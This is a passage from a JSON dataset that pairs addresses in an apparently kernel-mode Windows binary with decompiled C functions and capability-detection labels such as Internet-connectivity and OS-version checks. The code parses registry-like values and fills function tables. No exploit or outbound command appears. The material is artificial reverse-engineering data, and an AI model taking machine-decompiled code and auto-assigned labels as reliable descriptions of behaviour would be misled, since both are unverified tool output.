2;\n                        var_50h = arg_ch;\n                        do {\n                            iVar1 = *var_50h;\n                            var_50h = var_50h + 1;\n                        } while (iVar1 != 0);\n                        var_28h = var_2ch - ((var_50h - (arg_ch + 1) >> 1) * 2 + 2);\n                        var_18h = fcn.00035200(var_28h);\n                        if (var_18h == 0) {\n                            var_8h = -0x3fffff66;\n                            fcn.00035330(var_1ch);\n                            fcn.00035330(var_20h);\n                        }\n                        else {\n                            fcn.00078790(var_18h, 0, var_28h);\n                            fcn.0007877e(var_18h, var_20h, var_10h - var_20h);\n                            fcn.0007877e((var_10h - var_20h) + var_18h, var_24h, var_2ch - (var_24h - var_20h));\n                            var_8h = fcn.0003f750(*(var_ch + var_4h * 4), 0xb1be1fdc, var_18h, var_28h, 7);\n                            fcn.00035330(var_1ch);\n                            fcn.00035330(var_20h);\n                            fcn.00035330(var_18h);\n                        }\n                    }\ncode_r0x0003f2e7:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x0003f2fa;\n                }\n                fcn.00035330(var_1ch);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1204
    },
    "0003f310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint32_t __cdecl fcn.0003f310(uint arg_8h, int16_t *arg_ch, uint *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_10h = 0;\n    var_8h = fcn.0003f9b0(0xb1c588d8, 0xb1be1fbc, &var_ch);\n    if (var_8h != 0) {\ncode_r0x0003f48e:\n        fcn.0003f950(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x0003f47b;\n        var_14h = 0;\n        var_18h = 0;\n        var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fcc, &var_10h, &var_14h, &var_1ch);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078700(var_14h, arg_8h);\n            if (iVar2 == 0) {\n                fcn.00035330(var_14h);\n            }\n            else {\n                var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fdc, &var_10h, &var_18h, &var_1ch);\n                if (var_8h == 0) {\n                    var_20h = arg_ch;\n                    do {\n                        iVar1 = *var_20h;\n                        var_20h = var_20h + 1;\n                    } while (iVar1 != 0);\n                    iVar2 = fcn.0003fd50(var_18h, var_1ch, arg_ch, (var_20h - (arg_ch + 1) >> 1) << 1);\n                    if (iVar2 == 0) {\n                        *arg_10h = 0;\n                    }\n                    else {\n                        *arg_10h = 1;\n                    }\n                    var_8h = 0;\n                    fcn.00035330(var_14h);\n                    fcn.00035330(var_18h);\ncode_r0x0003f47b:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x0003f48e;\n                }\n                fcn.00035330(var_14h);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 722
    },
    "0003f4a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nint32_t __cdecl fcn.0003f4a0(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_54h;\n    uint var_4ch;\n    int16_t *var_48h;\n    uint var_44h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint var_34h;\n    uint var_2ch;\n    int16_t *var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = fcn.0003f9b0(0xb1c588d8, 0xb1be1fbc, &var_ch);\n    if (var_8h != 0) {\ncode_r0x0003f739:\n        fcn.0003f950(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x0003f726;\n        var_18h = 0;\n        var_1ch = 0;\n        var_14h = 0;\n        var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fcc, &var_10h, &var_18h, &var_24h);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078700(var_18h, arg_8h);\n            if (iVar2 == 0) {\n                fcn.00035330(var_18h);\n            }\n            else {\n                var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fdc, &var_10h, &var_1ch, &var_24h);\n                if (var_8h == 0) {\n                    var_28h = arg_ch;\n                    do {\n                        iVar1 = *var_28h;\n                        var_28h = var_28h + 1;\n                    } while (iVar1 != 0);\n                    iVar2 = fcn.0003fd50(var_1ch, var_24h, arg_ch, (var_28h - (arg_ch + 1) >> 1) << 1);\n                    if (iVar2 == 0) {\n                        var_38h = arg_ch;\n                        do {\n                            iVar1 = *var_38h;\n                            var_38h = var_38h + 1;\n                        } while (iVar1 != 0);\n                        var_20h = var_24h + 2 + (var_38h - (arg_ch + 1) >> 1) * 2;\n                        var_14h = fcn.00035200(var_20h);\n                        if (var_14h == 0) {\n                            var_8h = -0x3fffff66;\n                            fcn.00035330(var_18h);\n                            fcn.00035330(var_1ch);\n                        }\n                        else {\n                            fcn.00078790(var_14h, 0, var_20h);\n                            fcn.0007877e(var_14h, var_1ch, var_24h);\n                            var_48h = arg_ch;\n                            do {\n                                iVar1 = *var_48h;\n                                var_48h = var_48h + 1;\n                            } while (iVar1 != 0);\n                            fcn.0007877e(var_14h + -2 + var_24h, arg_ch, (var_48h - (arg_ch + 1) >> 1) << 1);\n                            var_8h = fcn.0003f750(*(var_ch + var_4h * 4), 0xb1be1fdc, var_14h, var_20h, 7);\n                            fcn.00035330(var_18h);\n                            fcn.00035330(var_1ch);\n                            fcn.00035330(var_14h);\n                        }\n                    }\n                    else {\n                        var_8h = 0;\n                        fcn.00035330(var_18h);\n                        fcn.00035330(var_1ch);\n                    }\ncode_r0x0003f726:\n                    if (*(var_ch + var_4h * 4) == 0) {\n                        var_8h = -0x3fffffff;\n                    }\n                    goto code_r0x0003f739;\n                }\n                fcn.00035330(var_18h);\n            }\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1131
    },
    "0003f750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003f750(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0;\n    fcn.00078550(&var_8h, arg_8h);\n    var_30h = 0x18;\n    var_2ch = 0;\n    var_24h = 0x140;\n    var_28h = &var_8h;\n    var_20h = 0;\n    var_1ch = 0;\n    var_10h = fcn.0007854a(&var_ch, 2, &var_30h);\n    if (var_10h == 0) {\n        fcn.00078550(&var_18h, arg_ch);\n        var_10h = fcn.0007853e(var_ch, &var_18h, 0, arg_18h, arg_10h, arg_14h);\n        fcn.00078544(var_ch);\n    }\n    return var_10h;\n}\n",
        "token_count": 314
    },
    "0003f7f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003f7f0(uint arg_8h, uint arg_ch, uint *arg_10h, int32_t *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    *arg_14h = 0;\n    fcn.00078550(&var_8h, arg_8h);\n    var_34h = 0x18;\n    var_30h = 0;\n    var_28h = 0x140;\n    var_2ch = &var_8h;\n    var_24h = 0;\n    var_20h = 0;\n    var_14h = fcn.0007854a(&var_ch, 1, &var_34h);\n    if (var_14h == 0) {\n        fcn.00078550(&var_1ch, arg_ch);\n        var_14h = fcn.00034bd0(var_ch, &var_1ch, 2, &var_10h);\n        fcn.00078544(var_ch);\n        if (var_14h == 0) {\n            if (((*(var_10h + 4) == 1) || (*(var_10h + 4) == 7)) || (*(var_10h + 4) == 2)) {\n                iVar1 = fcn.00035200(*(var_10h + 8) + 2);\n                *arg_14h = iVar1;\n                if (*arg_14h == 0) {\n                    var_14h = -0x3fffff66;\n                }\n                else {\n                    fcn.00078790(*arg_14h, 0, *(var_10h + 8) + 2);\n                    fcn.0007877e(*arg_14h, var_10h + 0xc, *(var_10h + 8));\n                    *arg_10h = *(var_10h + 4);\n                    *arg_18h = *(var_10h + 8);\n                }\n            }\n            else {\n                var_14h = -0x3fffffff;\n            }\n        }\n        fcn.00035330(var_10h);\n    }\n    return var_14h;\n}\n",
        "token_count": 596
    },
    "0003f950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003f950(int32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        for (var_4h = 0; *(arg_8h + var_4h * 4) != 0; var_4h = var_4h + 1) {\n            fcn.00035330(*(arg_8h + var_4h * 4));\n        }\n        fcn.00035330(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "0003f9b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6ch\n\nint32_t __cdecl fcn.0003f9b0(int16_t *arg_8h, int16_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_6ch;\n    uint var_64h;\n    int16_t *var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_50h;\n    int16_t *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    if (arg_8h == NULL) {\n        var_2ch = -0x3fffff11;\n    }\n    else if (arg_10h == NULL) {\n        var_2ch = -0x3fffff0f;\n    }\n    else {\n        *arg_10h = 0;\n        fcn.00078550(&var_18h, arg_8h);\n        var_44h = 0x18;\n        var_40h = 0;\n        var_38h = 0x140;\n        var_3ch = &var_18h;\n        var_34h = 0;\n        var_30h = 0;\n        var_2ch = fcn.0007854a(&var_24h, 8, &var_44h);\n        if (var_2ch == 0) {\n            var_48h = 0x418;\n            var_8h = fcn.00035200(0x418);\n            if (var_8h == 0) {\n                var_2ch = -0x3fffffe9;\n            }\n            else {\n                var_10h = 0;\ncode_r0x0003fa84:\n                uVar2 = var_24h;\n                var_2ch = fcn.00078610();\n                if (var_2ch == -0x3fffffdd) {\n                    fcn.00035330(var_8h);\n                    var_48h = var_28h;\n                    var_8h = fcn.00035200(var_28h);\n                    if (var_8h == 0) {\n                        var_2ch = -0x3fffffe9;\n                        goto code_r0x0003fd13;\n                    }\n                    uVar2 = var_24h;\n                    var_2ch = fcn.00078610();\n                }\n                if (var_2ch != -0x7fffffe6) {\n                    if (var_2ch == 0) goto code_r0x0003fa7b;\n                    goto code_r0x0003fd13;\n                }\n                var_1ch = var_10h;\n                var_20h = fcn.00035200(var_10h * 4 + 4);\n                if (var_20h == 0) {\n                    var_2ch = -0x3fffffe9;\n                    goto code_r0x0003fd13;\n                }\n                fcn.00078790(var_20h, 0, var_1ch * 4 + 4, uVar2);\n                if (arg_ch == NULL) {\n                    var_5ch = 0;\n                }\n                else {\n                    var_4ch = arg_ch;\n                    do {\n                        iVar1 = *var_4ch;\n                        var_4ch = var_4ch + 1;\n                    } while (iVar1 != 0);\n                    var_5ch = var_4ch - (arg_ch + 1) >> 1;\n                }\n                var_ch = var_5ch;\n                var_60h = arg_8h;\n                do {\n                    iVar1 = *var_60h;\n                    var_60h = var_60h + 1;\n                } while (iVar1 != 0);\n                var_4h = var_60h - (arg_8h + 1) >> 1;\n                var_10h = 0;\n                while( true ) {\n                    var_2ch = fcn.00078610(var_24h, var_10h, 0, var_8h, var_48h, &var_28h);\n                    if (var_2ch == -0x7fffffe6) {\n                        var_2ch = 0;\n                        goto code_r0x0003fd13;\n                    }\n                    if (var_2ch != 0) goto code_r0x0003fd13;\n                    *(var_8h + 0x10 + (*(var_8h + 0xc) & 0xfffffffe)) = 0;\n                    uVar2 = fcn.00035200((*(var_8h + 0xc) + var_ch + var_4h) * 2 + 8);\n                    *(var_20h + var_10h * 4) = uVar2;\n                    if (*(var_20h + var_10h * 4) == 0) break;\n                    if (arg_ch != NULL) {\n                        iVar3 = fcn.00078556(*(var_20h + var_10h * 4), *(var_8h + 0xc) + var_ch + 4 + var_4h, 0xb1be1ff0\n                                             , arg_8h, var_8h + 0x10, arg_ch);\n                        if (-1 < iVar3) goto code_r0x0003fbe6;\n                        var_2ch = -0x3fffffff;\n                        goto code_r0x0003fd13;\n                    }\n                    iVar3 = fcn.00078556(*(var_20h + var_10h * 4), *(var_8h + 0xc) + var_ch + 4 + var_4h, 0xb1bde768, \n                                         arg_8h, var_8h + 0x10);\n                    if (iVar3 < 0) {\n                        var_2ch = -0x3fffffff;\n                        goto code_r0x0003fd13;\n                    }\ncode_r0x0003fbe6:\n                    var_10h = var_10h + 1;\n                }\n                var_2ch = -0x3fffffe9;\n            }\ncode_r0x0003fd13:\n            if (var_8h != 0) {\n                fcn.00035330(var_8h);\n            }\n            if (var_2ch == 0) {\n                *arg_10h = var_20h;\n            }\n            else {\n                fcn.0003f950(var_20h);\n            }\n            fcn.00078544(var_24h);\n        }\n    }\n    return var_2ch;\ncode_r0x0003fa7b:\n    var_10h = var_10h + 1;\n    goto code_r0x0003fa84;\n}\n",
        "token_count": 1672
    },
    "0003fd50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0003fd50(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_4h;\n    \n    if ((arg_14h == 0) || (arg_ch < arg_14h)) {\n        return NULL;\n    }\n    if (arg_ch != arg_14h) {\n        if (arg_14h == 1) {\n            piVar1 = fcn.000786fa(arg_8h, *arg_10h, arg_ch);\n            return piVar1;\n        }\n        var_4h = arg_8h;\n        var_ch = (arg_ch - arg_14h) + 1;\n        do {\n            if (var_ch == 0) {\n                return NULL;\n            }\n            if ((*var_4h == *arg_10h) && (*(var_4h + (arg_14h - 1)) == *(arg_10h + (arg_14h - 1)))) {\n                if (arg_14h == 2) {\n                    return var_4h;\n                }\n                var_30h = arg_10h + 1;\n                var_34h = var_4h + 1;\n                for (var_2ch = arg_14h - 2; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                    if (*var_34h != *var_30h) goto code_r0x0003ff3e;\n                    var_30h = var_30h + 1;\n                    var_34h = var_34h + 1;\n                }\n                if (var_2ch == 0) {\ncode_r0x0003ffc0:\n                    var_3ch = 0;\n                }\n                else {\ncode_r0x0003ff3e:\n                    var_38h = *var_34h - *var_30h;\n                    if (var_38h == 0) {\n                        if (var_2ch == 1) goto code_r0x0003ffc0;\n                        var_38h = *(var_34h + 1) - *(var_30h + 1);\n                        if (var_38h == 0) {\n                            if (var_2ch == 2) goto code_r0x0003ffc0;\n                            var_38h = *(var_34h + 2) - *(var_30h + 2);\n                            if (var_38h == 0) {\n                                if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0))\n                                goto code_r0x0003ffc0;\n                            }\n                        }\n                    }\n                    var_3ch = 1;\n                    if (var_38h < 1) {\n                        var_3ch = -1;\n                    }\n                }\n                if (var_3ch == 0) {\n                    return var_4h;\n                }\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while( true );\n    }\n    var_18h = arg_10h;\n    var_1ch = arg_8h;\n    for (var_14h = arg_ch; 3 < var_14h; var_14h = var_14h - 4) {\n        if (*var_1ch != *var_18h) goto code_r0x0003fdb3;\n        var_18h = var_18h + 1;\n        var_1ch = var_1ch + 1;\n    }\n    if (var_14h == 0) {\ncode_r0x0003fe35:\n        var_24h = 0;\n    }\n    else {\ncode_r0x0003fdb3:\n        var_20h = *var_1ch - *var_18h;\n        if (var_20h == 0) {\n            if (var_14h == 1) goto code_r0x0003fe35;\n            var_20h = *(var_1ch + 1) - *(var_18h + 1);\n            if (var_20h == 0) {\n                if (var_14h == 2) goto code_r0x0003fe35;\n                var_20h = *(var_1ch + 2) - *(var_18h + 2);\n                if (var_20h == 0) {\n                    if ((var_14h == 3) || (var_20h = *(var_1ch + 3) - *(var_18h + 3),  var_20h == 0))\n                    goto code_r0x0003fe35;\n                }\n            }\n        }\n        var_24h = 1;\n        if (var_20h < 1) {\n            var_24h = -1;\n        }\n    }\n    if (var_24h != 0) {\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 1279
    },
    "00040080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00040080(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    int32_t var_154h;\n    uint var_150h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    int32_t var_a0h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_c4h = 0;\n    var_cch = 0;\n    var_c0h = 0;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        var_c4h = 0x21590065;\n    }\n    else {\n        fcn.00078550(&var_8h, 0xb1be1764);\n        puVar2 = arg_8h;\n        puVar3 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_c8h = *(var_a0h + 0x14);\n        var_c4h = fcn.00040520(arg_8h, &var_8h, &var_150h, &var_cch, &var_c0h);\n        if (var_c4h == 0) {\n            *0xb1c68500 = fcn.00041200(var_c0h, 0xcc, &var_150h, 0x7c);\n            if (*0xb1c68500 != 0) {\n                *0xb1c68508 = *0xb1c68500 + 1;\n                *0xb1c68504 = *0xb1c68500;\n            }\n            *0xb1c68510 = fcn.00040010(var_c0h, 0x100, 0xb1c0d7f0);\n            *0xb1c6851c = fcn.00040010(var_c0h, 0x100, 0xb1c0d7d0);\n            *0xb1c68524 = fcn.00040010(var_c0h, 0x100, 0xb1c0d7b0);\n            *0xb1c6852c = fcn.00040010(var_c0h, 0x100, 0xb1c0d790);\n            *0xb1c68534 = fcn.00040010(var_c0h, 0x100, 0xb1c0d770);\n            *0xb1c68544 = fcn.00040010(var_c0h, 0x100, 0xb1c0d750);\n            *0xb1c68548 = fcn.00040010(var_c0h, 0x100, 0xb1c0d730);\n            *0xb1c68538 = fcn.00040010(var_c0h, 0x100, 0xb1c0d710);\n            *0xb1c6853c = fcn.00040010(var_c0h, 0x100, 0xb1c0d6f0);\n            *0xb1c6854c = fcn.00040010(var_c0h, 0x100, 0xb1c0d6d0);\n            *0xb1c68520 = fcn.00040010(var_c0h, 0x100, 0xb1c0d6b0);\n            *0xb1c68528 = fcn.00040010(var_c0h, 0x100, 0xb1c0d690);\n            *0xb1c68568 = fcn.00040010(var_c0h, 0x100, 0xb1c0d670);\n            *0xb1c6856c = fcn.00040010(var_c0h, 0x100, 0xb1c0d650);\n            *0xb1c68570 = fcn.00040010(var_c0h, 0x100, 0xb1c0d630);\n            *0xb1c6850c = fcn.00040010(var_c0h, 0x100, var_cch);\n            if (arg_ch != NULL) {\n                *arg_ch = 0;\n                *arg_10h = 0;\n                iVar1 = fcn.00035230(4);\n                *arg_ch = iVar1;\n                if (*arg_ch == 0) {\n                    var_c4h = -0x3fffff66;\n                }\n                else {\n                    **arg_ch = 0;\n                    fcn.0001aa20(2, &var_ch, &var_bch);\n                    var_154h = var_c0h;\ncode_r0x000403b8:\n                    if ((var_154h == 0) || (*arg_ch == 0)) goto code_r0x000404b4;\n                    if ((var_154h == var_c0h) || (*(var_154h + 0xe) == '\\0')) {\ncode_r0x000403a9:\n                        var_154h = *(var_154h + 4);\n                        goto code_r0x000403b8;\n                    }\n                    iVar1 = fcn.00035260(arg_ch, *arg_10h << 2, *arg_10h * 4 + 4);\n                    if (iVar1 == 0) {\n                        *arg_ch[*arg_10h] = var_154h;\n                        *arg_10h = *arg_10h + 1;\n                        goto code_r0x000403a9;\n                    }\n                    var_c4h = -0x3fffff66;\n                    fcn.00035330(*arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\ncode_r0x000404b4:\n                    fcn.0001ab70(var_ch, var_bch);\n                }\n            }\n        }\n        if (var_c0h != 0) {\n            (**0xb1bde078)(var_c0h);\n        }\n        if (var_cch != 0) {\n            (**0xb1bde034)(var_cch, 0);\n        }\n        *(var_a0h + 0x14) = var_c8h;\n        puVar2 = &var_b8h;\n        for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *arg_8h = *puVar2;\n            puVar2 = puVar2 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 1598
    },
    "00040520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00040520(uint arg_8h, uint arg_ch, uchar *arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    (**0xb1bde03c)(arg_14h, arg_8h, arg_ch, 0);\n    if (*arg_14h == 0) {\n        uVar1 = 0xc0000001;\n    }\n    else {\n        fcn.00078790(arg_10h, 0, 0x7c);\n        *arg_10h = 5;\n        arg_10h[1] = 1;\n        *(arg_10h + 8) = 0xb1c0d7f0;\n        *(arg_10h + 0xc) = 0;\n        *(arg_10h + 0x10) = 0;\n        *(arg_10h + 0x14) = 0xb1c0d7d0;\n        *(arg_10h + 0x1c) = 0xb1c0d7b0;\n        *(arg_10h + 0x24) = 0xb1c0d790;\n        *(arg_10h + 0x2c) = 0xb1c0d770;\n        *(arg_10h + 0x3c) = 0xb1c0d750;\n        *(arg_10h + 0x40) = 0xb1c0d730;\n        *(arg_10h + 0x30) = 0xb1c0d710;\n        *(arg_10h + 0x34) = 0xb1c0d6f0;\n        *(arg_10h + 0x44) = 0xb1c0d6d0;\n        *(arg_10h + 0x18) = 0xb1c0d6b0;\n        *(arg_10h + 0x20) = 0xb1c0d690;\n        *(arg_10h + 0x60) = 0xb1c0d670;\n        *(arg_10h + 100) = 0xb1c0d650;\n        *(arg_10h + 0x68) = 0xb1c0d630;\n        uVar1 = (**0xb1bde038)(*arg_14h, arg_10h, 0x7c, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 563
    },
    "00040810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00040810(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_140h;\n    int32_t var_c0h;\n    uint var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_98h;\n    uint var_8h;\n    \n    var_b4h = 0x4e4d4944;\n    fcn.00078550(&var_8h, 0xb1be1764);\n    puVar2 = arg_8h;\n    puVar3 = &var_b0h;\n    for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    var_bch = *(var_98h + 0x14);\n    var_b8h = fcn.00040ad0(arg_8h, &var_8h, &var_140h);\n    if (var_b8h == 0) {\n        var_c0h = (**0xb1bde20c)(arg_8h, var_b4h);\n        if (var_c0h == 0) {\n            var_b8h = -0x3fffffff;\n        }\n        else {\n            *0xb1c68480 = fcn.00041200(var_c0h, 0xdc, &var_140h, 0x7c);\n            if (*0xb1c68480 != 0) {\n                *0xb1c68488 = *0xb1c68480 + 1;\n                *0xb1c68484 = *0xb1c68480;\n            }\n            *0xb1c6848c = fcn.00040010(var_c0h, 0x100, 0xb1c0dbd0);\n            *0xb1c68498 = fcn.00040010(var_c0h, 0x100, 0xb1c0dbf0);\n            *0xb1c684a0 = fcn.00040010(var_c0h, 0x100, 0xb1c0dc10);\n            *0xb1c684a8 = fcn.00040010(var_c0h, 0x100, 0xb1c0dc30);\n            *0xb1c684b0 = fcn.00040010(var_c0h, 0x100, 0xb1c0dc50);\n            *0xb1c684c0 = fcn.00040010(var_c0h, 0x100, 0xb1c0dc70);\n            *0xb1c684c4 = fcn.00040010(var_c0h, 0x100, 0xb1c0dc90);\n            *0xb1c684b8 = fcn.00040010(var_c0h, 0x100, 0xb1c0dcb0);\n            *0xb1c684c8 = fcn.00040010(var_c0h, 0x100, 0xb1c0dcd0);\n            *0xb1c6849c = fcn.00040010(var_c0h, 0x100, 0xb1c0dcf0);\n            *0xb1c684a4 = fcn.00040010(var_c0h, 0x100, 0xb1c0dd10);\n            *0xb1c684e4 = fcn.00040010(var_c0h, 0x100, 0xb1c0dd30);\n            *0xb1c684e8 = fcn.00040010(var_c0h, 0x100, 0xb1c0dd50);\n            *0xb1c684ec = fcn.00040010(var_c0h, 0x100, 0xb1c0dd70);\n            var_b8h = 0;\n        }\n    }\n    if (*0xb1c5b4f4 != 0) {\n        (**0xb1bde034)(*0xb1c5b4f4, 0);\n    }\n    *(var_98h + 0x14) = var_bch;\n    puVar2 = &var_b0h;\n    for (iVar1 = 0x2a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_8h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return var_b8h;\n}\n",
        "token_count": 1078
    },
    "00040ad0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
